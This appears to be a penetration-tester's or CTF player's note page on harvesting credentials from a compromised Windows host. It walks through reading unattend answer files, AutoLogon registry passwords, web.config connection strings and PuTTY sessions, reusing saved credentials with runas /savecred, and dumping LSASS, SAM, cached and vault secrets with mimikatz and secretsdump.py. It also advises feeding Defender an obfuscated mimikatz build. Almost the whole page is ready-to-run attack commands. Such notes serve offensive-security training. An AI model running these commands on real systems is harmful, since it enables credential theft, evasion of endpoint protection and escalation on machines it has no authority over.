# Windows — Credential Harvesting

The cheapest escalation on Windows is not an exploit — it is a password somebody left on disk. Run this sweep on every fresh shell before touching tokens, services or kernel CVEs: it costs five commands and it is the one path that needs no vulnerability at all.

Every location below exists because a legitimate feature had to store a secret somewhere. Each is a place to look, in the order it is worth looking; a hit at any of them can end the box.

## Unattended installation answer files

```cmd
type C:\Unattend.xml
```

```cmd
type C:\Windows\Panther\Unattend.xml
```

```cmd
type C:\Windows\Panther\Unattend\Unattend.xml
```

```cmd
type C:\Windows\system32\sysprep.inf
```

```cmd
type C:\Windows\system32\sysprep\sysprep.xml
```

- Five paths because the file lands in a different one depending on the deployment tool and Windows version. Run all five; the one that exists is not predictable.
- `C:\Windows\Panther\` → the copy administrators most often forget, because it is written during setup and not part of the image they scrub. Check it even when `C:\Unattend.xml` is gone.

```xml
<Credentials>
    <Username>Administrator</Username>
    <Domain>corp.local</Domain>
    <Password>MyPassword123</Password>
</Credentials>
```

> [!important] `<PlainText>false</PlainText>` does not mean encrypted
> Answer-file passwords are often stored base64-encoded, with `PlainText` set to `false`. That flag means "not literal text", not "protected" — decode it. The encoded blob usually has the string `AdministratorPassword` appended before encoding; strip it after decoding.

## PowerShell history

Whatever the user typed at a PowerShell prompt — passwords included — is on disk in their profile. Second stop on the sweep, and it has its own page: **[[PowerShell-History]]** holds the command, the per-user path, how to reach other users' files, and what an empty file does *not* mean.

## Saved Windows credentials

```cmd
cmdkey /list
```

```cmd
runas /savecred /user:admin cmd.exe
```

- `cmdkey /list` → the **names** of stored credentials and the target each is bound to; never the passwords themselves.
- `runas /savecred` → runs as that user using the stored credential, without your knowing it.
- `/user:admin` → must match a credential in the list exactly. A bare username with no domain only matches a local account; a stored `Domain:target=...` credential needs the form it was saved under or `runas` silently prompts for a password you do not have.

## AutoLogon registry credentials

The key is `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon` and it is readable by any user, which is the whole reason a low-privilege shell can reach it. Four of its roughly thirty values matter: `AutoAdminLogon`, `DefaultUserName`, `DefaultDomainName`, `DefaultPassword`, plus `AutoLogonSID` beside them.

> [!important] Do not skip the key because `AutoAdminLogon` is `0`
> Switching autologon back off clears the flag, not the value. `DefaultPassword` is left behind on plenty of hosts where autologon was set up once, used for a while and then disabled. A `0` tells you the feature is off today, not that no password was written yesterday — read the values, not the switch.

## IIS configuration

```cmd
type C:\inetpub\wwwroot\web.config
```

```cmd
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```

- `findstr connectionString` → `findstr` is cmd.exe's `grep`; the connection string is the line carrying `User ID=` and `Password=`, and piping to `findstr` pulls it out of a long config.
- The two paths are the **per-site** config (`wwwroot`) and the **machine-wide** .NET config. Sites often live outside `wwwroot`; if the app root is elsewhere, `type` that path's `web.config` instead.

## PuTTY stored sessions

```cmd
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```

- `/f "Proxy"` → search for this string in the key data, which narrows a large session tree to the proxy values.
- `/s` → recurse into all subkeys, one per saved session. Without it you read only the parent key, which holds no values, and the empty result reads as "no saved sessions".
- `HKEY_CURRENT_USER` → the hive of the account you are running as. It cannot see another user's saved sessions, so an empty result here says nothing about the other profiles on the box.

> [!note] Simon Tatham wrote PuTTY
> His name is part of the registry path, not a username on the target. Nothing to look up.

## With local admin — mimikatz on the box

Everything above needs no privilege; everything from here does. These stores hold hashes and secrets, not files you can `type`, and reaching them means **local administrator**, a mimikatz binary on the target, and — on a live box — Windows Defender either off or fed an obfuscated build, since mimikatz is the single most-signatured tool in existence. Run it from an elevated prompt. What it returns is spent, not read: a plaintext is a bonus, an [[Security-Terms#^nt-hash|NT hash]] is pass-the-hash fuel for [[AD-Authentication]].

### LSASS memory — live sessions

```text
privilege::debug
```

```text
sekurlsa::logonpasswords
```

- `privilege::debug` first → turns on `SeDebugPrivilege`, the right to read another process's memory. Skip it and `sekurlsa` cannot open LSASS, failing with `ERROR kuhl_m_sekurlsa_acquireLSA`.
- it reads **memory**, so it shows only sessions that exist now → a domain admin who logged in yesterday and logged off leaves nothing here.

### SAM + SYSTEM — local account hashes

```cmd
reg save HKLM\SAM C:\Windows\Temp\SAM
```

```cmd
reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM
```

```text
lsadump::sam /sam:C:\Windows\Temp\SAM /system:C:\Windows\Temp\SYSTEM
```

- two `reg save` calls, one hive each → both are needed, because the SAM is undecryptable without the SYSTEM boot key.
- `/sam:` and `/system:` must point at the files you just saved → mimikatz reads these copies, not the live registry, so a wrong path is a file-not-found rather than a crypto error.

### LSA cache — domain logons that already left

```text
token::elevate
```

```text
lsadump::cache
```

- `token::elevate` → steals a SYSTEM token; the cache lives under a registry key only SYSTEM reads, so without this `lsadump::cache` is access-denied.

### DPAPI vault — saved app passwords

```text
vault::list
```

```text
vault::cred /export
```

- `vault::list` names the vaults and items; `vault::cred /export` is the one that prints recovered pairs → run `list` first to know whether `export` has anything to find.

### Remote — one host, no binary dropped

```bash
secretsdump.py 'HOST/Administrator:password@host-ip'
```

- no `-just-dc` here → against an ordinary workstation you *want* the local SAM and the cached domain logons, which is exactly what the bare run returns. `-just-dc` is for a domain controller ([[DCSync]]).
- runs over SMB (Server Message Block, the Windows file-sharing protocol on port 445) via the remote registry → the account must be local admin on the target; a valid-but-unprivileged credential authenticates and then cannot read the hives.
